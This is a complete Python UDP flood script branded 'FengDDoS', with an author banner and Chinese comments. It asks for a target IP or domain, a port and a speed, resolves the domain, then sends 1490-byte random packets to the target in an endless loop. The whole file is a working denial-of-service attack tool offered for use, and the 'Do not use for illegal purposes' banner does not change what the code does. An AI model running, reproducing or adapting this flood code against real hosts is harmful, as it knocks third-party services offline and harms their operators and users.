# python3
import sys
import os
import time
import socket
import random
# Code Time
from datetime import datetime
# 新增导入 gethostbyname 用于域名解析
from socket import gethostbyname 

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet FengDDoS")
print (" ")
print ("---------------------------------------------------")
print (" Author : FengPwner ")
print (" Github : https://github.com/FengPwner ")
print (" Atomgit : https://atomgit.com/FengPwner ")
print (" CSDN : https://blog.csdn.net/2302_76189356 ")
print (" Version : 0.3.1 (Modified) ")
print ("---------------------------------------------------")
print (" To update, please use `git pull` ")
print ("---------------------------------------------------")
print (" ")
print (" ")
print (" -----------------[Do not use for illegal purposes]----------------- ")
print (" ")
print (" ")
print (" ")
print (" ")

# --- 修改开始 ---
target = input("IP or Domain: ")
try:
    # 尝试将输入解析为IP地址。如果是域名，gethostbyname会自动将其转换为IP
    ip = gethostbyname(target)
    print(f"[+] Resolved target to IP: {ip}")
except socket.gaierror:
    # 如果解析失败（既不是合法IP也不是合法域名），则退出
    print("[-] Error: Could not resolve the specified IP or Domain.")
    sys.exit(1)
# --- 修改结束 ---

port = int(input("port: "))
sd = int(input("speed(1~1000) : "))

os.system("clear")
sent = 0
while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    print ("Sent %s data packet to %s port %d"%(sent,ip,port))
    time.sleep((1000-sd)/2000)
